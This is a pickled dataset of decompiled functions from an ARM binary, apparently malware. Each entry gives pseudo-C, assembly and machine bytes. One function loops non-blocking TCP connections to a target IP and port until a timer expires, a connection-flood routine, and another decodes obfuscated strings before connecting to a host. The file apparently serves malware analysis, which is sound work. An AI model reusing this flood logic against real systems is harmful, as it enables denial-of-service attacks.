S'.text:000093b0\n.text:000093b4\n.text:000093b8\n.text:000093bc\n.text:000093c0\n.text:000093c4\n.text:000093c8\n.text:000093cc\n.text:000093d0\n.text:000093d4\n.text:000093d8\n.text:000093dc\n.text:000093e0\n.text:000093e4\n.text:000093e8\n.text:000093ec\n.text:000093f0\n.text:000093f4\n.text:000093f8\n.text:000093fc\n.text:00009400\n.text:00009404\n.text:00009408\n.text:0000940c\n.text:00009410\n.text:00009414\n.text:00009418\n.text:0000941c\n.text:00009420\n.text:00009424\n.text:00009428\n.text:0000942c\n.text:00009430\n.text:00009434\n.text:00009438\n.text:0000943c\n.text:00009440\n.text:00009444\n.text:00009448\n.text:0000944c\n.text:00009450\n.text:00009454\n.text:00009458\n.text:0000945c\n.text:00009460\n.text:00009464\n.text:00009468\n.text:0000946c\n.text:00009470\n.text:00009474\n.text:00009478\n.text:0000947c\n.text:00009480\n.text:00009484\n.text:00009488\n.text:0000948c\n.text:00009490\n.text:00009494\n.text:00009498\n.text:0000949c\n.text:000094a0\n.text:000094a4\n.text:000094a8\n.text:000094ac\n.text:000094b0\n.text:000094b4\n.text:000094b8\n.text:000094bc\n.text:000094c0\n.text:000094c4\n.text:000094c8\n.text:000094cc\n.text:000094d0\n.text:000094d4\n.text:000094d8\n.text:000094dc\n.text:000094e0\n.text:000094e4\n.text:000094e8\n.text:000094ec\n.text:000094f0\n.text:000094f4\n.text:000094f8\n.text:000094fc\n.text:00009500\n.text:00009504\n.text:00009508\n.text:0000950c\n.text:00009510\n.text:00009514\n.text:00009518\n.text:0000951c\n.text:00009520\n.text:00009524\n.text:00009528\n.text:0000952c\n.text:00009530\n.text:00009534\n.text:00009538\n.text:0000953c\n.text:00009540\n.text:00009544\n.text:00009548\n.text:0000954c\n.text:00009550\n.text:00009554\n.text:00009558\n.text:0000955c\n.text:00009560\n.text:00009564\n.text:00009568\n.text:0000956c\n.text:00009570\n.text:00009574\n.text:00009578\n.text:0000957c\n.text:00009580\n.text:00009584\n.text:00009588\n.text:0000958c\n.text:00009590\n.text:00009594\n.text:00009598\n.text:0000959c\n.text:000095a0\n.text:000095a4\n.text:000095a8\n.text:000095ac\n.text:000095b0\n.text:000095b4\n.text:000095b8\n.text:000095bc\n.text:000095c0\n.text:000095c4\n.text:000095c8\n.text:000095cc\n.text:000095d0\n.text:000095d4\n.text:000095d8\n.text:000095dc\n.text:000095e0\n.text:000095e4\n.text:000095e8\n.text:000095ec\n.text:000095f0\n.text:000095f4\n.text:000095f8\n.text:000095fc\n.text:00009600\n.text:00009604\n.text:00009608\n.text:0000960c\n.text:00009610\n.text:00009614\n.text:00009618\n.text:0000961c\n.text:00009620\n.text:00009624\n.text:00009628\n.text:0000962c\n.text:00009630\n.text:00009634\n.text:00009638\n.text:0000963c\n.text:00009640\n.text:00009644\n.text:00009648\n.text:0000964c\n.text:00009650\n.text:00009654\n.text:00009658\n.text:0000965c\n.text:00009660\n.text:00009664\n.text:00009668\n.text:0000966c\n.text:00009670\n.text:00009674\n.text:00009678\n.text:0000967c\n.text:00009680\n.text:00009684\n'
p293
tp294
sS'free'
p295
(S'\n__stdcall free(void * __ptr)\n'
p296
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid free(void *__ptr)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008acc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013368)();\u000a  return;\u000a}\u000a\u000a
p297
S'adr r12,0x8acc\nadd r12,r12,#0xa000\nldr pc,[r12,#0x89c]!\n'
p298
S'00 c6 8f e2\n0a ca 8c e2\n9c f8 bc e5\n'
p299
S'.plt:00008ac4\n.plt:00008ac8\n.plt:00008acc\n'
p300
tp301
sS'close'
p302
(S'\n__stdcall close(int __fd)\n'
p303
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint close(int __fd)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ac0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013364)();\u000a  return iVar1;\u000a}\u000a\u000a
p304
S'adr r12,0x8ac0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8a4]!\n'
p305
S'00 c6 8f e2\n0a ca 8c e2\na4 f8 bc e5\n'
p306
S'.plt:00008ab8\n.plt:00008abc\n.plt:00008ac0\n'
p307
tp308
sS'connect'
p309
(S'\n__stdcall connect(int __fd, sockaddr * __addr, socklen_t __len)\n'
p310
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint connect(int __fd,sockaddr *__addr,socklen_t __len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008934. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132e0)();\u000a  return iVar1;\u000a}\u000a\u000a
p311
S'adr r12,0x8934\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9ac]!\n'
p312
S'00 c6 8f e2\n0a ca 8c e2\nac f9 bc e5\n'
p313
S'.plt:0000892c\n.plt:00008930\n.plt:00008934\n'
p314
tp315
sS'atoi'
p316
(S'\n__stdcall atoi(char * __nptr)\n'
p317
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint atoi(char *__nptr)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a9c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013358)();\u000a  return iVar1;\u000a}\u000a\u000a
p318
S'adr r12,0x8a9c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8bc]!\n'
p319
S'00 c6 8f e2\n0a ca 8c e2\nbc f8 bc e5\n'
p320
S'.plt:00008a94\n.plt:00008a98\n.plt:00008a9c\n'
p321
tp322
sS'malloc'
p323
(S'\n__stdcall malloc(size_t __size)\n'
p324
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * malloc(size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008958. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000132ec)();\u000a  return pvVar1;\u000a}\u000a\u000a
p325
S'adr r12,0x8958\nadd r12,r12,#0xa000\nldr pc,[r12,#0x994]!\n'
p326
S'00 c6 8f e2\n0a ca 8c e2\n94 f9 bc e5\n'
p327
S'.plt:00008950\n.plt:00008954\n.plt:00008958\n'
p328
tp329
sS'FUN_00008e38'
p330
(S'\n__stdcall FUN_00008e38()\n'
p331
V\u000avoid FUN_00008e38(char *pcParm1,int iParm2,int iParm3)\u000a\u000a{\u000a  int iVar1;\u000a  char cVar2;\u000a  int iVar3;\u000a  uint uVar4;\u000a  time_t tVar5;\u000a  time_t tVar6;\u000a  int iVar7;\u000a  undefined *__fd;\u000a  int *piVar8;\u000a  undefined **ppuVar9;\u000a  int iVar10;\u000a  timeval *ptStack212;\u000a  timeval **local_d0;\u000a  uint local_cc [32];\u000a  undefined local_4c;\u000a  undefined local_4b;\u000a  undefined local_4a;\u000a  undefined local_49;\u000a  in_addr_t local_48;\u000a  __fd_mask local_44;\u000a  __fd_mask local_40;\u000a  __fd_mask local_3c;\u000a  __fd_mask local_38;\u000a  int local_34;\u000a  __fd_mask local_30;\u000a  __fd_mask _Stack4;\u000a  \u000a  _Stack4 = 0x8e44;\u000a  local_d0 = &ptStack212;\u000a  uVar4 = getdtablesize();\u000a  local_49 = (undefined)iParm2;\u000a  local_4c = 2;\u000a  local_4b = 0;\u000a  local_4a = (undefined)((uint)(iParm2 << 0x10) >> 0x18);\u000a  local_48 = inet_addr(pcParm1);\u000a  if (local_48 != 0xffffffff) {\u000a    iVar1 = (int)(uVar4 + (uVar4 >> 0x1f)) >> 1;\u000a    iVar3 = -(iVar1 * 8 + 4);\u000a    local_44 = 0;\u000a    local_40 = 0;\u000a    memset((undefined **)((int)&local_d0 + iVar3),0,iVar1 * 5,\u000a           *(undefined *)((int)&ptStack212 + iVar3));\u000a    tVar5 = time(0,*(undefined *)((int)&ptStack212 + iVar3));\u000aLAB_00008eec:\u000a    tVar6 = time(0,*(undefined *)((int)&ptStack212 + iVar3));\u000a    if (tVar6 < tVar5 + iParm3) {\u000a      if (0 < iVar1) {\u000a        iVar10 = 0;\u000a        ppuVar9 = (undefined **)((int)&local_d0 + iVar3);\u000a        do {\u000a          while( true ) {\u000a            cVar2 = *(char *)(ppuVar9 + 1);\u000a            if (cVar2 == 1) break;\u000a            if (cVar2 == 0) {\u000a              __fd = (undefined *)socket(2,1,0,*(undefined *)((int)&ptStack212 + iVar3));\u000a              *ppuVar9 = __fd;\u000a              uVar4 = fcntl((int)__fd,3,0);\u000a              fcntl((int)__fd,4,uVar4 | 0x800);\u000a              iVar7 = connect(*ppuVar9,&local_4c,0x10,*(undefined *)((int)&ptStack212 + iVar3));\u000a              if ((iVar7 == -1) &&\u000a                 (piVar8 = __errno_location(*(undefined *)((int)&ptStack212 + iVar3)),\u000a                 *piVar8 == 0x73)) {\u000a                *(undefined *)(ppuVar9 + 1) = 1;\u000a              }\u000a              else {\u000a                close(*ppuVar9,*(undefined *)((int)&ptStack212 + iVar3));\u000a              }\u000a            }\u000a            else {\u000a              if (cVar2 == 2) {\u000a                iVar7 = 0;\u000a                do {\u000a                  *(undefined4 *)((int)((fd_set *)local_cc)->fds_bits + iVar7) = 0;\u000a                  iVar7 = iVar7 + 4;\u000a                } while (iVar7 != 0x80);\u000a                __fd = *ppuVar9;\u000a                local_38 = 10000;\u000a                local_cc[(uint)__fd >> 5] = local_cc[(uint)__fd >> 5] | 1 << ((uint)__fd & 0x1f);\u000a                local_3c = 0;\u000a                *(__fd_mask **)((int)&ptStack212 + iVar3) = &local_3c;\u000a                iVar7 = select((int)(__fd + 1),(fd_set *)0x0,(fd_set *)0x0,(fd_set *)local_cc,\u000a                               *(timeval **)((int)&ptStack212 + iVar3));\u000a                if (iVar7 != 0) goto LAB_00009008;\u000a              }\u000a            }\u000aLAB_00008f74:\u000a            iVar10 = iVar10 + 1;\u000a            ppuVar9 = ppuVar9 + 2;\u000a            if (iVar1 == iVar10) goto LAB_00008eec;\u000a          }\u000a          iVar7 = 0;\u000a          do {\u000a            *(undefined4 *)((int)((fd_set *)local_cc)->fds_bits + iVar7) = 0;\u000a            iVar7 = iVar7 + 4;\u000a          } while (iVar7 != 0x80);\u000a          __fd = *ppuVar9;\u000a          local_38 = 10000;\u000a          local_cc[(uint)__fd >> 5] = local_cc[(uint)__fd >> 5] | 1 << ((uint)__fd & 0x1f);\u000a          local_3c = 0;\u000a          *(__fd_mask **)((int)&ptStack212 + iVar3) = &local_3c;\u000a          iVar7 = select((int)(__fd + 1),(fd_set *)0x0,(fd_set *)local_cc,(fd_set *)0x0,\u000a                         *(timeval **)((int)&ptStack212 + iVar3));\u000a          if (iVar7 == 1) {\u000a            __fd = *ppuVar9;\u000a            local_30 = 4;\u000a            *(__fd_mask **)((int)&ptStack212 + iVar3) = &local_30;\u000a            getsockopt((int)__fd,1,4,&local_34,*(socklen_t **)((int)&ptStack212 + iVar3));\u000a            if (local_34 != 0) goto LAB_00009008;\u000a            *(undefined *)(ppuVar9 + 1) = 2;\u000a            goto LAB_00008f74;\u000a          }\u000a          if (iVar7 == -1) {\u000aLAB_00009008:\u000a            close(*ppuVar9,*(undefined *)((int)&ptStack212 + iVar3));\u000a            *(undefined *)(ppuVar9 + 1) = 0;\u000a            goto LAB_00008f74;\u000a          }\u000a          iVar10 = iVar10 + 1;\u000a          ppuVar9 = ppuVar9 + 2;\u000a        } while (iVar1 != iVar10);\u000a      }\u000a      goto LAB_00008eec;\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p332
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0xa8\ncpy r4,r1\ncpy r5,r0\ncpy r7,r2\nbl 0x00008914\nmov r4,r4, lsl #0x10\nmov r2,r4, lsr #0x8\nand r2,r2,#0xff00\norr r2,r2,r4, lsr #0x18\nmov r1,r2, asr #0x8\nmov r3,#0x2\ncpy r6,r0\nmov r4,#0x0\ncpy r0,r5\nstrb r3,[r11,#-0x48]\nstrb r1,[r11,#-0x45]\nstrb r4,[r11,#-0x47]\nstrb r2,[r11,#-0x46]\nbl 0x000089bc\ncmn r0,#0x1\nstr r0,[r11,#-0x44]\nstr sp,[r11,#-0xcc]\nbeq 0x00008f00\nadd r3,r6,r6, lsr #0x1f\nmov r6,r3, asr #0x1\nmov r2,r6, lsl #0x3\nadd r2,r2,#0x4\nrsb sp,r2,sp\nadd r9,sp,#0x4\nmov r2,r6, lsl #0x2\nadd r2,r2,r6\ncpy r1,r4\ncpy r0,r9\nstr r4,[r11,#-0x40]\nstr r4,[r11,#-0x3c]\nbl 0x00008a40\ncpy r0,r4\nbl 0x00008a58\nadd r8,r0,r7\nb 0x00008eec\ncmp r6,#0x0\nbgt 0x00008f08\nmov r0,#0x0\nbl 0x00008a58\ncmp r8,r0\nbgt 0x00008ee4\nldr sp,[r11,#-0xcc]\nsub sp,r11,#0x28\nldmia sp,{ r4 r5 r6 r7 r8 r9 r10 r11 sp pc }\ncpy r5,r9\nmov r10,#0x0\nldrb r3,[r5,#0x4]\ncmp r3,#0x1\nbeq 0x00009018\nbcs 0x00008f88\nmov r1,#0x1\nmov r2,#0x0\nmov r0,#0x2\nbl 0x00008968\nmov r1,#0x3\nmov r2,#0x0\nstr r0,[r5,#0x0]\ncpy r4,r0\nbl 0x00008aac\nmov r1,#0x4\norr r2,r0,#0x800\ncpy r0,r4\nbl 0x00008aac\nldr r0,[r5,#0x0]\nsub r1,r11,#0x48\nmov r2,#0x10\nbl 0x0000892c\ncmn r0,#0x1\nbeq 0x000090b0\nldr r0,[r5,#0x0]\nbl 0x00008ab8\nadd r10,r10,#0x1\ncmp r6,r10\nadd r5,r5,#0x8\nbeq 0x00008eec\nb 0x00008f10\ncmp r3,#0x2\nbne 0x00008f74\nmov r3,#0x0\nsub r7,r11,#0xc8\ncpy r4,r3\nstr r4,[r3,r7]\nadd r3,r3,#0x4\ncmp r3,#0x80\nbne 0x00008f9c\nldr r0,[r5,#0x0]\nmov r1,r0, lsr #0x5\nsub r3,r11,#0x28\nmov r1,r1, lsl #0x2\nadd r1,r1,r3\nldr r12,[r1,#-0xa0]\nand lr,r0,#0x1f\nmov r2,#0x1\norr r12,r12,r2, lsl lr\nmov r3,#0x2700\nadd r3,r3,#0x10\nstr r3,[r11,#-0x34]\nsub r3,r11,#0x38\nstr r12,[r1,#-0xa0]\nstr r4,[r11,#-0x38]\nadd r0,r0,r2\nstr r3,[sp,#0x0]\ncpy r1,r4\ncpy r3,r7\ncpy r2,r4\nbl 0x00008974\ncmp r0,#0x0\nbeq 0x00008f74\nldr r0,[r5,#0x0]\nbl 0x00008ab8\nstrb r4,[r5,#0x4]\nb 0x00008f74\nmov r3,#0x0\nsub r7,r11,#0xc8\ncpy r4,r3\nstr r4,[r3,r7]\nadd r3,r3,#0x4\ncmp r3,#0x80\nbne 0x00009024\nldr r0,[r5,#0x0]\nmov r1,r0, lsr #0x5\nsub r3,r11,#0x28\nmov r1,r1, lsl #0x2\nadd r1,r1,r3\nldr r12,[r1,#-0xa0]\nand lr,r0,#0x1f\nmov r2,#0x1\norr r12,r12,r2, lsl lr\nmov r3,#0x2700\nadd r3,r3,#0x10\nstr r3,[r11,#-0x34]\nsub r3,r11,#0x38\nstr r12,[r1,#-0xa0]\nstr r4,[r11,#-0x38]\nadd r0,r0,r2\nstr r3,[sp,#0x0]\ncpy r1,r4\ncpy r2,r7\ncpy r3,r4\nbl 0x00008974\ncmp r0,#0x1\ncpy r1,r0\nbeq 0x000090cc\ncmn r0,#0x1\nbeq 0x00009008\nadd r10,r10,#0x1\ncmp r6,r10\nadd r5,r5,#0x8\nbeq 0x00008eec\nb 0x00008f10\nbl 0x00008a7c\nldr r3,[r0,#0x0]\ncmp r3,#0x73\nmoveq r3,#0x1\nstrbeq r3,[r5,#0x4]\nbne 0x00008f6c\nb 0x00008f74\nmov r2,#0x4\nsub r3,r11,#0x2c\nldr r0,[r5,#0x0]\nstr r2,[r11,#-0x2c]\nstr r3,[sp,#0x0]\nsub r3,r11,#0x30\nbl 0x00008a70\nldr r3,[r11,#-0x30]\ncmp r3,#0x0\nmoveq r3,#0x2\nstrbeq r3,[r5,#0x4]\nbeq 0x00008f74\nb 0x00009008\n'
p333
S'0d c0 a0 e1\nf0 df 2d e9\n04 b0 4c e2\na8 d0 4d e2\n01 40 a0 e1\n00 50 a0 e1\n02 70 a0 e1\nae fe ff eb\n04 48 a0 e1\n24 24 a0 e1\nff 2c 02 e2\n24 2c 82 e1\n42 14 a0 e1\n02 30 a0 e3\n00 60 a0 e1\n00 40 a0 e3\n05 00 a0 e1\n48 30 4b e5\n45 10 4b e5\n47 40 4b e5\n46 20 4b e5\nca fe ff eb\n01 00 70 e3\n44 00 0b e5\ncc d0 0b e5\n17 00 00 0a\na6 3f 86 e0\nc3 60 a0 e1\n86 21 a0 e1\n04 20 82 e2\n0d d0 62 e0\n04 90 8d e2\n06 21 a0 e1\n06 20 82 e0\n04 10 a0 e1\n09 00 a0 e1\n40 40 0b e5\n3c 40 0b e5\nda fe ff eb\n04 00 a0 e1\nde fe ff eb\n07 80 80 e0\n01 00 00 ea\n00 00 56 e3\n06 00 00 ca\n00 00 a0 e3\nd8 fe ff eb\n00 00 58 e1\nf9 ff ff ca\ncc d0 1b e5\n28 d0 4b e2\nf0 af 9d e8\n09 50 a0 e1\n00 a0 a0 e3\n04 30 d5 e5\n01 00 53 e3\n3e 00 00 0a\n19 00 00 2a\n01 10 a0 e3\n00 20 a0 e3\n02 00 a0 e3\n8d fe ff eb\n03 10 a0 e3\n00 20 a0 e3\n00 00 85 e5\n00 40 a0 e1\nd9 fe ff eb\n04 10 a0 e3\n02 2b 80 e3\n04 00 a0 e1\nd5 fe ff eb\n00 00 95 e5\n48 10 4b e2\n10 20 a0 e3\n71 fe ff eb\n01 00 70 e3\n50 00 00 0a\n00 00 95 e5\nd0 fe ff eb\n01 a0 8a e2\n0a 00 56 e1\n08 50 85 e2\nd9 ff ff 0a\ne1 ff ff ea\n02 00 53 e3\nf8 ff ff 1a\n00 30 a0 e3\nc8 70 4b e2\n03 40 a0 e1\n07 40 83 e7\n04 30 83 e2\n80 00 53 e3\nfb ff ff 1a\n00 00 95 e5\na0 12 a0 e1\n28 30 4b e2\n01 11 a0 e1\n03 10 81 e0\na0 c0 11 e5\n1f e0 00 e2\n01 20 a0 e3\n12 ce 8c e1\n27 3c a0 e3\n10 30 83 e2\n34 30 0b e5\n38 30 4b e2\na0 c0 01 e5\n38 40 0b e5\n02 00 80 e0\n00 30 8d e5\n04 10 a0 e1\n07 30 a0 e1\n04 20 a0 e1\n5c fe ff eb\n00 00 50 e3\nda ff ff 0a\n00 00 95 e5\na9 fe ff eb\n04 40 c5 e5\nd6 ff ff ea\n00 30 a0 e3\nc8 70 4b e2\n03 40 a0 e1\n07 40 83 e7\n04 30 83 e2\n80 00 53 e3\nfb ff ff 1a\n00 00 95 e5\na0 12 a0 e1\n28 30 4b e2\n01 11 a0 e1\n03 10 81 e0\na0 c0 11 e5\n1f e0 00 e2\n01 20 a0 e3\n12 ce 8c e1\n27 3c a0 e3\n10 30 83 e2\n34 30 0b e5\n38 30 4b e2\na0 c0 01 e5\n38 40 0b e5\n02 00 80 e0\n00 30 8d e5\n04 10 a0 e1\n07 20 a0 e1\n04 30 a0 e1\n3a fe ff eb\n01 00 50 e3\n00 10 a0 e1\n0d 00 00 0a\n01 00 70 e3\nda ff ff 0a\n01 a0 8a e2\n0a 00 56 e1\n08 50 85 e2\n8f ff ff 0a\n97 ff ff ea\n71 fe ff eb\n00 30 90 e5\n73 00 53 e3\n01 30 a0 03\n04 30 c5 05\na8 ff ff 1a\na9 ff ff ea\n04 20 a0 e3\n2c 30 4b e2\n00 00 95 e5\n2c 20 0b e5\n00 30 8d e5\n30 30 4b e2\n61 fe ff eb\n30 30 1b e5\n00 00 53 e3\n02 30 a0 03\n04 30 c5 05\n9d ff ff 0a\nc1 ff ff ea\n'
p334
S'.text:00008e38\n.text:00008e3c\n.text:00008e40\n.text:00008e44\n.text:00008e48\n.text:00008e4c\n.text:00008e50\n.text:00008e54\n.text:00008e58\n.text:00008e5c\n.text:00008e60\n.text:00008e64\n.text:00008e68\n.text:00008e6c\n.text:00008e70\n.text:00008e74\n.text:00008e78\n.text:00008e7c\n.text:00008e80\n.text:00008e84\n.text:00008e88\n.text:00008e8c\n.text:00008e90\n.text:00008e94\n.text:00008e98\n.text:00008e9c\n.text:00008ea0\n.text:00008ea4\n.text:00008ea8\n.text:00008eac\n.text:00008eb0\n.text:00008eb4\n.text:00008eb8\n.text:00008ebc\n.text:00008ec0\n.text:00008ec4\n.text:00008ec8\n.text:00008ecc\n.text:00008ed0\n.text:00008ed4\n.text:00008ed8\n.text:00008edc\n.text:00008ee0\n.text:00008ee4\n.text:00008ee8\n.text:00008eec\n.text:00008ef0\n.text:00008ef4\n.text:00008ef8\n.text:00008efc\n.text:00008f00\n.text:00008f04\n.text:00008f08\n.text:00008f0c\n.text:00008f10\n.text:00008f14\n.text:00008f18\n.text:00008f1c\n.text:00008f20\n.text:00008f24\n.text:00008f28\n.text:00008f2c\n.text:00008f30\n.text:00008f34\n.text:00008f38\n.text:00008f3c\n.text:00008f40\n.text:00008f44\n.text:00008f48\n.text:00008f4c\n.text:00008f50\n.text:00008f54\n.text:00008f58\n.text:00008f5c\n.text:00008f60\n.text:00008f64\n.text:00008f68\n.text:00008f6c\n.text:00008f70\n.text:00008f74\n.text:00008f78\n.text:00008f7c\n.text:00008f80\n.text:00008f84\n.text:00008f88\n.text:00008f8c\n.text:00008f90\n.text:00008f94\n.text:00008f98\n.text:00008f9c\n.text:00008fa0\n.text:00008fa4\n.text:00008fa8\n.text:00008fac\n.text:00008fb0\n.text:00008fb4\n.text:00008fb8\n.text:00008fbc\n.text:00008fc0\n.text:00008fc4\n.text:00008fc8\n.text:00008fcc\n.text:00008fd0\n.text:00008fd4\n.text:00008fd8\n.text:00008fdc\n.text:00008fe0\n.text:00008fe4\n.text:00008fe8\n.text:00008fec\n.text:00008ff0\n.text:00008ff4\n.text:00008ff8\n.text:00008ffc\n.text:00009000\n.text:00009004\n.text:00009008\n.text:0000900c\n.text:00009010\n.text:00009014\n.text:00009018\n.text:0000901c\n.text:00009020\n.text:00009024\n.text:00009028\n.text:0000902c\n.text:00009030\n.text:00009034\n.text:00009038\n.text:0000903c\n.text:00009040\n.text:00009044\n.text:00009048\n.text:0000904c\n.text:00009050\n.text:00009054\n.text:00009058\n.text:0000905c\n.text:00009060\n.text:00009064\n.text:00009068\n.text:0000906c\n.text:00009070\n.text:00009074\n.text:00009078\n.text:0000907c\n.text:00009080\n.text:00009084\n.text:00009088\n.text:0000908c\n.text:00009090\n.text:00009094\n.text:00009098\n.text:0000909c\n.text:000090a0\n.text:000090a4\n.text:000090a8\n.text:000090ac\n.text:000090b0\n.text:000090b4\n.text:000090b8\n.text:000090bc\n.text:000090c0\n.text:000090c4\n.text:000090c8\n.text:000090cc\n.text:000090d0\n.text:000090d4\n.text:000090d8\n.text:000090dc\n.text:000090e0\n.text:000090e4\n.text:000090e8\n.text:000090ec\n.text:000090f0\n.text:000090f4\n.text:000090f8\n.text:000090fc\n'
p335
tp336
sS'gethostbyname'
p337
(S'\n__stdcall gethostbyname(char * __name)\n'
p338
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000ahostent * gethostbyname(char *__name)\u000a\u000a{\u000a  hostent *phVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a6c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  phVar1 = (hostent *)(*(code *)PTR_LAB_00013348)();\u000a  return phVar1;\u000a}\u000a\u000a
p339
S'adr r12,0x8a6c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8dc]!\n'
p340
S'00 c6 8f e2\n0a ca 8c e2\ndc f8 bc e5\n'
p341
S'.plt:00008a64\n.plt:00008a68\n.plt:00008a6c\n'
p342
tp343
sS'getdtablesize'
p344
(S'\n__stdcall getdtablesize()\n'
p345
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getdtablesize(void)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000891c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132d8)();\u000a  return iVar1;\u000a}\u000a\u000a
p346
S'adr r12,0x891c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9bc]!\n'
p347
S'00 c6 8f e2\n0a ca 8c e2\nbc f9 bc e5\n'
p348
S'.plt:00008914\n.plt:00008918\n.plt:0000891c\n'
p349
tp350
sS'fork'
p351
(S'\n__stdcall fork()\n'
p352
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t fork(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a24. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_00013330)();\u000a  return _Var1;\u000a}\u000a\u000a
p353
S'adr r12,0x8a24\nadd r12,r12,#0xa000\nldr pc,[r12,#0x90c]!\n'
p354
S'00 c6 8f e2\n0a ca 8c e2\n0c f9 bc e5\n'
p355
S'.plt:00008a1c\n.plt:00008a20\n.plt:00008a24\n'
p356
tp357
sS'FUN_00009b20'
p358
(S'\n__stdcall FUN_00009b20()\n'
p359
V\u000avoid FUN_00009b20(char *pcParm1,uint uParm2,undefined4 uParm3,int iParm4)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  time_t tVar3;\u000a  hostent *phVar4;\u000a  int __fd;\u000a  int iVar5;\u000a  size_t __n;\u000a  time_t tVar6;\u000a  int iVar7;\u000a  char cVar8;\u000a  int iVar9;\u000a  undefined *puVar10;\u000a  bool bVar11;\u000a  char acStack568 [512];\u000a  undefined local_38;\u000a  undefined local_37;\u000a  undefined local_36;\u000a  undefined local_35;\u000a  undefined auStack52 [12];\u000a  undefined4 local_28;\u000a  \u000a  tVar3 = time((time_t *)0x0);\u000a  local_28 = 1;\u000a  phVar4 = gethostbyname(pcParm1);\u000a  if (phVar4 != (hostent *)0x0) {\u000a    bcopy(*phVar4->h_addr_list,auStack52,phVar4->h_length);\u000a    local_35 = (undefined)uParm2;\u000a    local_36 = (undefined)((uParm2 << 0x10) >> 0x18);\u000a    local_38 = 2;\u000a    local_37 = 0;\u000a    __fd = socket(2,1,6);\u000a    setsockopt(__fd,6,1,&local_28,4);\u000a    puVar1 = PTR_DAT_0000a074;\u000a    if (__fd != -1) {\u000a      memset(PTR_DAT_0000a074 + 4,0,0x200);\u000a      puVar2 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar1 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      }\u000a      else {\u000a        iVar9 = *(int *)puVar1;\u000a        iVar7 = 0;\u000a        puVar10 = puVar1;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar7 + iVar9);\u000a            bVar11 = cVar8 == puVar2[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar1 + 0x204));\u000a      }\u000a      puVar1[iVar7 + 4] = 0;\u000a      strcpy(acStack568,PTR_DAT_0000a080);\u000a      __n = strlen(acStack568);\u000a      puVar2 = PTR_DAT_0000a084;\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a088,4);\u000a      memset(puVar2 + 4,0,0x200);\u000a      puVar1 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar2 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      }\u000a      else {\u000a        iVar9 = *(int *)puVar2;\u000a        iVar7 = 0;\u000a        puVar10 = puVar2;\u000a        do {\u000a          iVar5 = 0;\u000a          do {\u000a            cVar8 = *(char *)(iVar9 + iVar7);\u000a            bVar11 = cVar8 == puVar1[iVar5];\u000a            if (bVar11) {\u000a              cVar8 = PTR_DAT_0000a07c[iVar5];\u000a            }\u000a            iVar5 = iVar5 + 1;\u000a            if (bVar11) {\u000a              puVar10[4] = cVar8;\u000a            }\u000a          } while (iVar5 != 0x41);\u000a          iVar7 = iVar7 + 1;\u000a          puVar10 = puVar10 + 1;\u000a        } while (iVar7 < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a      }\u000a      puVar2[iVar7 + 4] = 0;\u000a      strcat(acStack568,PTR_DAT_0000a08c);\u000a      __n = strlen(acStack568);\u000a      puVar2 = PTR_DAT_0000a090;\u000a      memcpy(acStack568 + __n,PTR_DAT_0000a094,2);\u000a      memset(puVar2 + 4,0,0x200);\u000a      puVar1 = PTR_DAT_0000a078;\u000a      if (*(short *)(puVar2 + 0x204) == 0) {\u000a        iVar7 = 0;\u000a      